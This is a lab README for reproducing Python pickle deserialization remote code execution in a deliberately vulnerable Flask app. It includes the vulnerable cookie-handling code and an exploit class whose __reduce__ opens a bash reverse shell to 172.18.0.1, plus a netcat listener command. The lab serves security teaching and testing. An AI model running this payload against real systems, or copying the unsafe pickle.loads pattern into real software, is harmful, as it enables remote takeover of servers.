# Python Unpickle Deserialization Remote Code Execution

[中文版本(Chinese version)](README.zh-cn.md)

Python's pickle module is a popular serialization/deserialization tool that converts Python objects into byte streams and vice versa. However, when untrusted data is deserialized using pickle, it can lead to arbitrary code execution.

This vulnerability occurs when an application deserializes user-controlled data using the pickle module without proper validation. An attacker can craft a malicious serialized object that, when deserialized, executes arbitrary commands on the target system.

References:

- http://rickgray.me/2015/09/12/django-command-execution-analysis.html
- https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
- https://docs.python.org/3/library/pickle.html#pickle.loads
- https://intoli.com/blog/dangerous-pickles/

## Environment Setup

Execute the following command to start the vulnerable Flask application:

```
docker compose build
docker compose up -d
```

After the server is started, you can access `http://your-ip:8000` in your browser. The page will display `Hello {username}!`, where username is retrieved from the 'user' cookie. The application performs base64 decoding and deserialization on this cookie to extract the "username" variable. If no valid cookie is found, it defaults to "Guest".

The vulnerable code in app.py looks like this:

```python
@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Hello %s" % username
```

## Vulnerability Reproduction

To exploit this vulnerability, we need to create a malicious pickle object that will execute arbitrary commands when deserialized. The exploit uses Python's `__reduce__` method to specify what function to call when the object is unpickled.

The provided exploit script (exp.py) creates a malicious pickle object that establishes a reverse shell connection to the attacker's machine:

```python
class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (os.system, (s,))
```

To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:

```
nc -lvp 80
```

Then run the exploit script to send the malicious cookie to the vulnerable application:

```
python3 exp.py
```

When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:

![Reverse Shell Demonstration](1.png)
